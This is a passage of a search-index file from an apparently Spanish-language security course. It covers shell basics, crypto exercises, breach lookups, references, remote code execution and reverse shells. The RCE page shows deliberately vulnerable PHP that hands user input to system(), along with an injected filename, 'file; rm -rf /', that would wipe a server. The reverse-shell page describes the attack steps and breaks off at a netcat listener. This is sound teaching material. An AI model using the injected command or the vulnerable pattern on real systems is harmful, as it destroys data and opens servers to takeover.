(agregando texto al final si existe), puedo usar el operador \u003ccode\u003edoble mayor-que\u003c/code\u003e (\u003ccode\u003e\u0026gt;\u0026gt;\u003c/code\u003e) al final del comando:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003estrings archivo.bin \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;CC5325\u0026#34;\u003c/span\u003e 2\u0026gt;\u0026gt; salida.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSi quiero que \u003cstrong\u003ela salida de error estándar\u003c/strong\u003e de un comando se guarde en un archivo (sobreescribiéndolo si existe), puedo usar el operador \u003ccode\u003emayor-que\u003c/code\u003e con un \u003ccode\u003e2\u003c/code\u003e a la izquierda (\u003ccode\u003e2\u0026gt;\u003c/code\u003e) al final del comando:\u003c/p\u003e\n\u003cp\u003eSi quiero que \u003cstrong\u003ela salida de error estándar\u003c/strong\u003e de un comando se guarde en un archivo (agregando texto al final si existe), puedo usar el operador \u003ccode\u003edoble mayor-que\u003c/code\u003e con un \u003ccode\u003e2\u003c/code\u003e a la izquierda (\u003ccode\u003e2\u0026gt;\u0026gt;\u003c/code\u003e) al final del comando:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003estrings archivo.bin \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;CC5325\u0026#34;\u003c/span\u003e 2\u0026gt;\u0026gt; salida.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"redirigir-salidas-y-entradas\"\u003eRedirigir Salidas y Entradas\u003c/h2\u003e\n\u003cp\u003ePuedo redirigir juntas la salida estandar y la salida de error estándar a un mismo archivo con el operador \u003ccode\u003e2\u0026gt;\u0026amp;1\u003c/code\u003e al final del comando:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003estrings archivo.bin \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s2\"\u003e\u0026#34;CC5325\u0026#34;\u003c/span\u003e 2\u0026gt;\u0026gt; salida.txt 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"scripts-de-shell\"\u003eScripts de Shell\u003c/h2\u003e\n\u003cp\u003eLa \u003ccode\u003eshell\u003c/code\u003e incluye internamente un lenguaje de programación completo, con estructuras de control de flujo, iteraciones, definición de funciones, entre otros. Uno puede escribir código de script en el mismo terminal, o escribirlo en un archivo cuya primera línea sea similar a esta:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"cp\"\u003e#! /bin/bash\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ePara ejecutar este archivo, hay que cambiar sus permisos para que se permita la ejecución (\u003ccode\u003echmod 755 archivo.sh\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003eNo entraremos en detalle de cómo crear scripts de shell acá, pero les recomendamos \u003ca href=\"https://www.tutorialspoint.com/unix/shell_scripting.htm\"\u003eesta referencia\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 id=\"comandos-útiles\"\u003eComandos útiles\u003c/h2\u003e\n\u003cp\u003eLa siguiente lista de comandos útiles irá creciendo con el tiempo, según los comandos que veamos en el curso.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eman [comando]\u003c/code\u003e - \u003cem\u003eMuestra información sobre el comando\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003ecat [archivo]\u003c/code\u003e - \u003cem\u003eMuestra el contenido de un archivo\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003egrep\u003c/code\u003e - \u003cem\u003eBuscar patrones en un texto\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003estrings [archivo]\u003c/code\u003e - \u003cem\u003eMuestra los caracteres ascii dentro de un archivo\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003ewhatis\u003c/code\u003e - \u003cem\u003eMuestra en una linea el uso de un comando\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003eunzip [archivo]\u003c/code\u003e - \u003cem\u003eDescomprime un archivo .zip\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003efile [archivo]\u003c/code\u003e - \u003cem\u003eDice que tipo de archivo es el archivo dado\u003c/em\u003e\u003cbr\u003e\n\u003ccode\u003exxd [archivo]\u003c/code\u003e - \u003cem\u003eMuestra todo el contenido del archivo, pero en hexadecimal con su representación ascii a la derecha\u003c/em\u003e\u003c/p\u003e\n"},{id:26,href:"/docs/cripto-moderna/ejercicios/",title:"Ejercicios Cripto Moderna",description:null,content:"\u003ch2 id=\"recursos-generales\"\u003eRecursos Generales\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://cryptopals.com/\"\u003e\u003cstrong\u003eCryptopals\u003c/strong\u003e\u003c/a\u003e: Ejercicios de implementación de herramientas para ejecutar ataques criptográficos\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"criptografía-simétrica\"\u003eCriptografía Simétrica\u003c/h2\u003e\n\u003ch3 id=\"hack-the-box\"\u003eHack The Box\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Flippin-Bank\"\u003eFlippin Bank\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.eu/challenges/Broken-Decryptor\"\u003eBroken Decryptor\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"otros\"\u003eOtros\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://users.dcc.uchile.cl/~eriveros/cc5312/laboratorios/laboratorio-1/\"\u003eLaboratorio 1, Pregunta 2, Curso CC5312 2020/1\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"criptografía-asimétrica\"\u003eCriptografía Asimétrica\u003c/h2\u003e\n\u003ch3 id=\"hack-the-box-1\"\u003eHack The Box\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e[]\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"otros-1\"\u003eOtros\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://users.dcc.uchile.cl/~eriveros/cc5312/laboratorios/laboratorio-1/\"\u003eLaboratorio 1, Pregunta 1, Curso CC5312 2020/1\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:27,href:"/docs/osint/haveibeenpwned/",title:"Have I Been Pwned",description:null,content:"\u003cp\u003e\u003ca href=\"https://haveibeenpwned.com/\"\u003eHave I Been Pwned\u003c/a\u003e es un sitio web que recopila contraseñas filtradas, asociadas a\nun correo. Luego, los usuarios pueden ingresar su correo, y el sitio responde si se ha encontrado\ncontraseñas para ese correo, y de dónde salieron. Esto puede ser particularmente importante, pues la gran\nmayoría de las personas reutilizan sus contraseñas en muchos lugares diferentes, de vez en cuando con alguna\nvariación mínima.\u003c/p\u003e\n\u003cp\u003eEl sitio también permite buscar de manera segura si una contraseña particular ha sido filtrada en algún momento.\nEsto funciona calculando el Hash de la contraseña de manera local, y luego enviando una parte de este Hash\nal servidor. El servidor responde con todos los hashes que coinciden con el valor enviado, los cuales son\ncomparados localmente con el Hash completo de la contraseña. De esta forma, en ningún momento se envía\nla contraseña (ni su Hash completo) al servidor, dejando que el cliente haga las comparaciones localmente.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eNota\u003c/strong\u003e: Que un correo aparezca comprometido no significa que actualmente lo esté. Quiere decir que en algún\nmomento alguna contraseña asociada a ese correo se filtró.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eQueremos verificar si un correo ha sido comprometido, por lo que ingresamos a\n\u003ca href=\"https://haveibeenpwned.com/\"\u003eHave I Been Pwned\u003c/a\u003e y hacemos la búsqueda.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../haveibeenpwned-search.png\" alt=\"Búsqueda en HaveIBeenPwned\"\u003e\u003c/p\u003e\n\u003cp\u003eSi no se encuentra \u003cem\u003ebreaches\u003c/em\u003e relacionados, el sitio nos lo indica en verde.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../haveibeenpwned-safe.png\" alt=\"No Comprometido\"\u003e\u003c/p\u003e\n\u003cp\u003eEn cambio, si efectivamente ha habido filtraciones de contraseñas asociadas al correo, se mostrará en rojo.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../haveibeenpwned-pwned.png\" alt=\"Comprometido\"\u003e\u003c/p\u003e\n\u003cp\u003eMás abajo podemos revisar específicamente dónde y cuándo se produjo la filtración. Esto nos ayuda a determinar\nsi la contraseña filtrada fue una antigua o actual, y nos muestra específicamente qué datos fueron comprometidos.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../haveibeenpwned-breaches.png\" alt=\"Breaches\"\u003e\u003c/p\u003e\n"},{id:28,href:"/docs/anexos/referencias/",title:"Referencias",description:null,content:"\u003cp\u003eA continuación se mencionan las referencias usadas para la realización de cada capítulo del apunte. También se agregan algunas referencias extra que podrían ser útiles para profundizar en contenidos.\u003c/p\u003e\n\u003ch2 id=\"esteganografía\"\u003eEsteganografía\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eCodificaciones\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Character_encoding\"\u003eCodificaciones de Caracteres (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Unicode\"\u003eUnicode (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/ASCII\"\u003eASCII (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859\"\u003eISO/IEC 8859 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/UTF-8\"\u003eUTF-8 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Morse_code\"\u003eCódigo Morse (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eLenguajes Esotéricos\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Esoteric_programming_language\"\u003eEsolangs (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://esolangs.org/wiki/Main_Page\"\u003eWiki de Lenguajes Esotéricos\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eOfuscación de Código\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Obfuscation_(software)\"\u003eOfuscación (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eCriptografía Clásica\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/History_of_cryptography\"\u003eHistoria de la Criptografía (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Classical_cipher\"\u003eCriptografía Clásica (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Letter_frequency\"\u003eFrecuencia de Caracteres (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eHerramientas de Esteganografía Generales\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.dcode.fr\"\u003eDCode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://cryptii.com/\"\u003eCryptii\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ReFirmLabs/binwalk\"\u003eBinwalk\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eEsteganografía en Audio\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/WAV\"\u003eWAV (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/MP3\"\u003eMP3 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/ID3\"\u003eID3 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eEsteganografía en Texto\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Acrostic\"\u003eAcrósticos (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eEsteganografía en Imágenes\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Portable_Network_Graphics\"\u003ePNG (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.w3.org/TR/PNG/\"\u003eEspecificación Oficial PNG\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/JPEG\"\u003eJPEG (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://jpeg.org/jpeg/\"\u003eEspecificación Oficial JPEG\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Scalable_Vector_Graphics\"\u003eSVG (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.w3.org/TR/SVG2/\"\u003eEspecificación Oficial SVG\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"criptografía-moderna\"\u003eCriptografía Moderna\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eLibro \u003ca href=\"https://www.amazon.com/Serious-Cryptography-Practical-Introduction-Encryption-ebook/dp/B0722MTGQV\"\u003e\u0026ldquo;Serious Cryptography: A Practical Introduction to Modern Encryption\u0026rdquo; de Jean-Philippe Aumasson\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/MD5\"\u003eMD5 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Secure_Hash_Algorithms\"\u003eSecure Hash Algorithms (SHA) (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Key_derivation_function\"\u003eKey Derivation Function (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Block_cipher\"\u003eCifradores de Bloque (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation\"\u003eModos de Cifradores de Bloque (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Stream_cipher\"\u003eCifradores de flujo (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/RC4\"\u003eRC4 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/DES\"\u003eDigital Encryption Standard (DES) (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Salsa20\"\u003eSalsa20 (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Advanced_Encryption_Standard\"\u003eAdvanced Encryption Standard (AES) (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/HMAC\"\u003eHMAC (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/RSA_(cryptosystem)\"\u003eRSA (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange\"\u003eDiffie-Hellman (Wikipedia)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"aplicaciones-web\"\u003eAplicaciones Web\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/rapid7/metasploit-framework\"\u003eOWASP\u003c/a\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-top-ten/\"\u003eTop 10\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-web-security-testing-guide/\"\u003eWeb Security Testing Guide\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-dependency-track/\"\u003eDependency Track\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-juice-shop/\"\u003eJuice Shop\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-mobile-security-testing-guide/\"\u003eMobile Security Testing Guide\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-modsecurity-core-rule-set/\"\u003eModSecurity Core Rule Set\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-samm/\"\u003eSoftware Assurance Maturity Model (SAMM)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-security-knowledge-framework/\"\u003eSecurity Knowledge Framework\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-project-zap/\"\u003eZed Attack Proxy (ZAP)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://owasp.org/www-community/xss-filter-evasion-cheatsheet\"\u003eGuía de Evasión de Filtros XSS\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/digininja/DVWA\"\u003eDamn Vulnerable Web Application (DVWA)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.w3schools.com/js/DEFAULT.asp\"\u003eTutorial de JavaScript\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.w3schools.com/sql/default.asp\"\u003eTutorial de SQL\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.first.org/cvss/v3.1/specification-document\"\u003eEspecificaciones CVSS\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.exploit-db.com/\"\u003eExploit DB\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://vuldb.com/\"\u003eVulDB\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.cvedetails.com/\"\u003eCVE Details\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"análisis-forense\"\u003eAnálisis Forense\u003c/h2\u003e\n\u003ch2 id=\"ingeniería-reversa\"\u003eIngeniería Reversa\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.tutorialspoint.com/assembly_programming/index.htm\"\u003eAssembler\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://book.rada.re/index.html\"\u003eDocumentación radare2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.megabeets.net/a-journey-into-radare-2-part-1/\"\u003eTutorial radare2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"pwning\"\u003ePwning\u003c/h2\u003e\n\u003ch2 id=\"osint\"\u003eOSINT\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Google_hacking\"\u003eGoogle Hacking\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://gbhackers.com/latest-google-dorks-list/\"\u003eGoogle Dorks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/search/advanced\"\u003eGithub Search\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:29,href:"/docs/apps-web/rce/",title:"Remote Code Execution",description:null,content:"\u003cp\u003eEl Remote Code Execution (RCE) se refiere a la ejecución de comandos de sistema, o de algún lenguaje instalado, sin tener acceso a una\nterminal ni algún otro canal permitido para ejecutar comandos. El alcance de este ataque depende del sistema\noperativo, frameworks, lenguajes y filtros que se tenga instalados en el servidor.\u003c/p\u003e\n\u003cp\u003eSimilar a las inyecciones SQL de segundo orden, \u003cstrong\u003ela ejecución de comandos remotos pueden y suelen requerir\nmúltiples pasos\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"formas-de-rce\"\u003eFormas de RCE\u003c/h2\u003e\n\u003cp\u003eExisten muchas formas de explotar esta vulnerabilidad, pero las más comunes son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSubir archivos ejecutables\u003c/strong\u003e: Por ejemplo PHP, que al ser visualizados en el navegador, el servidor ejecuta\nsu código.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInyección de comandos\u003c/strong\u003e: Similarmente a las inyecciones SQL, a veces se utiliza variables controladas por el\nusuario en la ejecución de comandos de sistema, sin ser sanitizadas primero.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSQLi\u003c/strong\u003e: Muchos sistemas administradores de bases de datos permiten la ejecución de comandos de sistema,\npor lo que al lograr SQLi también se puede lograr RCE.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBuffer Overflows\u003c/strong\u003e: De vez en cuando un servidor web ejecuta un proceso que tiene un mal manejo de memoria.\nEsto muchas veces puede ser explotado para controlar a nivel de bytes las instrucciones que lleva\na cabo el servidor.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDeserialización\u003c/strong\u003e: La serialización es una forma de codificar un objeto para poder almacenarlo o transmitirlo por\nla red. Si un servidor recibe un objeto serializado, muy probablemente intentará deserializarlo (proceso inverso).\nEsto puede ser aprovechado modificando el objeto serializado para controlar sus métodos o atributos.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eType Confusion\u003c/strong\u003e: Este tipo de vulnerabilidades surgen solo en lenguajes que son capaces de comparar variables\nde distinto tipo (por ejemplo PHP). Luego, esto puede ser utilizado para \u0026ldquo;confundir\u0026rdquo; al servidor y ejecutar\nramas del código que no son normalmente accesibles.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eUna vez que se logra explotar exitosamente el RCE, el atacante hereda los permisos del usuario que maneja el\nsistema explotado, usualmente \u003ccode\u003ewww-data\u003c/code\u003e. Si este usuario puede leer y escribir en un directorio, el atacante\ntambién podrá hacerlo. Si tiene permisos de \u003ccode\u003eroot\u003c/code\u003e, el atacante también los tendrá.\u003c/p\u003e\n\u003cp\u003eEste es el primero paso para tomar control de un servidor. Una vez que se tiene control de la ejecución de\ncomandos, se puede intentar escalar privilegios (ganar privilegios elevado) o realizar movimientos laterales\n(obtener privilegios de otros usuarios no elevados).\u003c/p\u003e\n\u003ch2 id=\"ejemplos\"\u003eEjemplos\u003c/h2\u003e\n\u003cp\u003ePara ilustrar esto, veamos un caso de inyección de comandos. Asumamos que tenemos un endpoint en un servidor PHP,\nhecho específicamente para crear archivos, en donde su nombre y su contenido se entregan por parámetros POST.\nEl código que se encarga de esto podría ser algo como:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$filename = $_POST['filename'];\n$content = $_POST['content'];\nsystem(\u0026quot;echo '$content' \u0026gt; $filename\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEsto puede ser muy fácilmente escapado y explotado con el caracter \u003ccode\u003e;\u003c/code\u003e en el nombre del archivo. Por ejemplo,\nsi definimos el nombre del archivo como \u003ccode\u003efile; rm -rf /\u003c/code\u003e, el servidor estaría almacenando el contenido enviado\nen el archivo \u003ccode\u003efile\u003c/code\u003e, para luego terminar ese comando y eliminar todo dentro del directorio \u003ccode\u003e/\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eOtro ejemplo es un servidor al cual se puede subir archivos y luego visualizarlos. Existen muchos archivos,\nllamados \u003cem\u003ewebshells\u003c/em\u003e, los cuales están hechos con este propósito. Varían dependiendo del lenguaje utilizado\nen el servidor, y solo funcionan para lenguajes ejecutados en el lado del servidor.\n\u003ca href=\"https://github.com/tennc/webshell\"\u003eAquí\u003c/a\u003e pueden encontrar un repositorio con webshells para\nmuchos lenguajes diferentes.\u003c/p\u003e\n"},{id:30,href:"/docs/apps-web/reverse-shell/",title:"Reverse Shell",description:null,content:"\u003cp\u003eEn el capítulo anterior vimos cómo ejecutar comandos de manera remota en un servidor, sin tener acceso a una\nterminal. Esto es muy útil en un comienzo, pero rápidamente se vuelve evidente la lentitud, torpeza y limitaciones\nque significa este medio. Sería mucho más cómodo si de alguna forma se pudiese obtener acceso a una terminal,\no \u003cem\u003eshell\u003c/em\u003e, con la cual ejecutar comandos de manera más directa, y sin tener que pasar por todo el proceso\nremoto.\u003c/p\u003e\n\u003cp\u003eAfortunadamente existen las shell reversas: a diferencia de una shell normal, en la cual el cliente se conecta\na un servidor escuchando por conexiones, una shell reversa implica que el cliente está a la espera de una\nconexión, y es el servidor quien la inicia. Asumiendo que ya tienen RCE, es posible iniciar una reverse shell con\nun par de comandos, aunque puede ser necesario evadir algún filtro, firewall o antivirus.\u003c/p\u003e\n\u003cp\u003eLos pasos para levantar una reverse shell son los siguientes:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eEl atacante espera por conexiones TCP en algún puerto específico (por ejemplo 4444).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eEl servidor inicia una conexión TCP con el atacante en el puerto especificado.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUna vez establecida la conexión, el servidor levanta una shell\n(como \u003ccode\u003esh\u003c/code\u003e o \u003ccode\u003ebash\u003c/code\u003e en Linux, y \u003ccode\u003ecmd.exe\u003c/code\u003e o \u003ccode\u003epowershell.exe\u003c/code\u003e en Windows).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eTodos los mensajes del atacante son redirigidos a la entrada estándar de la shell, y la salida estándar de\nesta es redirigida por la conexión hacia el atacante.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"herramientas\"\u003eHerramientas\u003c/h2\u003e\n\u003cp\u003eEn términos generales, cualquier programa que permita escuchar e iniciar comunicaciones TCP, y luego redirigir\nlas entradas y salidas estándar, debería funcionar. Los más comunes son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLinux: \u003ccode\u003enc\u003c/code\u003e, \u003ccode\u003encat\u003c/code\u003e, \u003ccode\u003enetcat\u003c/code\u003e, \u003ccode\u003esocat\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eWindows: \u003ccode\u003enc.exe\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTambién se puede iniciar reverse shells con casi todos los lenguajes de programación.\n\u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\"\u003eAquí\u003c/a\u003e\npueden encontrar documentación sobre muchas técnicas distintas de iniciar reverse shells.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003ch3 id=\"cliente\"\u003eCliente\u003c/h3\u003e\n\u003cp\u003ePara empezar a escuchar en el puerto \u003ccode\u003e4444\u003c/code\u003e por conexiones TCP, puede usar \u003ccode\u003enc\u003c/code\u003e de la siguiente forma:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003enc -lvp 